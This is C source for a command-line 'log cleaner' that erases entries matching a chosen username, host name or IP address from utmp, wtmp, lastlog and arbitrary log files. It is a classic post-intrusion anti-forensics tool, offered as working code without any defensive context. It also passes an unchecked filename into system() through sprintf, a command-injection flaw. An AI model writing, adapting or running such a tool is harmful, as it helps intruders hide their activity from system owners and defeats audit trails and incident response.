#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <fcntl.h>		
#include <utmp.h>		
#include <sys/types.h>	
#include <sys/stat.h>
#include <unistd.h>
#include <lastlog.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <limits.h>

#define MAXBUFF	8*1024

void print_usage()
{
	fprintf(stderr,
	"\nusage: cl -uwlL [filename] [param]\n-u  clear UTMP\n-w  clear WTMP\n-l  clear LASTLOG\n-L clear LOGFILE\nparam must be an ip address in dot notation, a username, or a host name.\n");
}

int main (int argc, char *argv[])
{
	struct utmp ut;		
	struct lastlog ll;		
	struct passwd *pass;
	struct stat f_attr;
	char buffer[MAXBUFF];
	int begin_l_break, end_l_break;
	int fin, fout, ret;
	int option, size;
	char username[UT_NAMESIZE];
	char host[UT_HOSTSIZE];
	char ip[17];
	char filename[PATH_MAX];
	char command[PATH_MAX+ 20];
	unsigned long int ip_addr;
	
	
	if (argc!=4)
	{
		print_usage();
		return EXIT_FAILURE;
	}
		
	option = getopt(argc, argv, "uwlL");
			
	strncpy(filename, argv[2], PATH_MAX);
	strncpy(username, argv[3], UT_NAMESIZE);
	strncpy(host, argv[3], UT_HOSTSIZE);
	strncpy(ip, argv[3], sizeof(ip));
	
	ip_addr = inet_addr(ip);
	
	fin = open(filename, O_RDWR);
	
	if (fin < 0)
	{
		fprintf(stderr, "\ntarget: %s not locked.\n", filename);
		close(fin);
		return EXIT_FAILURE;
	}
	
	switch (option)
	{
		case 'u':
			size = sizeof(ut);
			while (read(fin, &ut, size)==size)
			{
				if (	(!strncmp(ut.ut_host, host, strlen(host))) ||
				 	(!strncmp(ut.ut_user, username, strlen(username))) ||
				 	ut.ut_addr == ip_addr)
					
				{
					memset(&ut, 0, size);
					lseek(fin, -1*size, SEEK_CUR);
					write(fin, &ut, size);
				}
			}
			printf("\nUTMP target: %s processed.\n", filename) ;
			break;
		
		case 'w':
			size = sizeof(ut);
		
			fout = open("wtmp.hm", O_WRONLY|O_CREAT);
			
			if (fout < 0)
			{
				fprintf(stderr, "\nCannot create wtmp.hm.\n") ;	
				close(fout);
				return EXIT_FAILURE;
			}
			
			while (read (fin, &ut, size) == size)
			{
				if (!((!strncmp(ut.ut_user, username, strlen(username))) ||
					 (!strncmp(ut.ut_host, host, strlen(host))) ||
					 ut.ut_addr == ip_addr))
					write (fout, &ut, size);
			}
			fstat(fin, &f_attr);
               fchmod(fout, f_attr.st_mode);
			close (fout);
			sprintf(command,"mv wtmp.hm %s",filename);
			ret = system(command);
			if(ret==-1||ret==127)	
				fprintf(stderr, "\nCouldn't replace %s.\n", filename);
 			printf("\nWTMP target: %s processed.\n", filename);
 			break;
		
		case 'l':
			size = sizeof(ll);
			pass = getpwnam(username);
			lseek(fin, size*pass->pw_uid, SEEK_SET);
			read(fin, &ll, size);
			ll.ll_time = 0;
			strncpy (ll.ll_line, "      ", 5);
			strcpy (ll.ll_host, " ");
			lseek(fin, size*pass->pw_uid, SEEK_SET);
			write(fin, &ll, size);
			printf("\nLastlog target: %s processed.\n", filename);
			break;
		case 'L':
			fout = open("tmp.hm", O_WRONLY|O_CREAT);
			if (fout < 0)
			{
				fprintf(stderr, "\nCannot create tmp.hm\n") ;
				close (fout) ;
				return EXIT_FAILURE;
			}
			
			do
			{
				size = read(fin, buffer, MAXBUFF);
				end_l_break = 0;
				while(end_l_break<size)
				{
					begin_l_break = end_l_break;
					for(;buffer[end_l_break]!='\n'&&end_l_break<size;++end_l_break);
					if (!memmem(buffer + begin_l_break*sizeof(char), end_l_break - begin_l_break, username, strlen(username)))
						write(fout, buffer + begin_l_break*sizeof(char),end_l_break - begin_l_break + 1);
					++end_l_break;
				}
				lseek(fin, begin_l_break - MAXBUFF, SEEK_CUR);
			}
			while (size == MAXBUFF);
			
			fstat(fin, &f_attr);
               fchmod(fout, f_attr.st_mode);
			close (fout);
			sprintf(command,"mv tmp.hm %s",filename);
			ret = system(command);
			if(ret==-1||ret==127)	
				fprintf(stderr, "\nCouldn't replace %s.\n", filename);
			printf("\nLogfile target: %s processed.\n", filename);
			break;
		case '?':
			print_usage();
			return EXIT_FAILURE;
	}
	close(fin);
	return EXIT_SUCCESS;
}
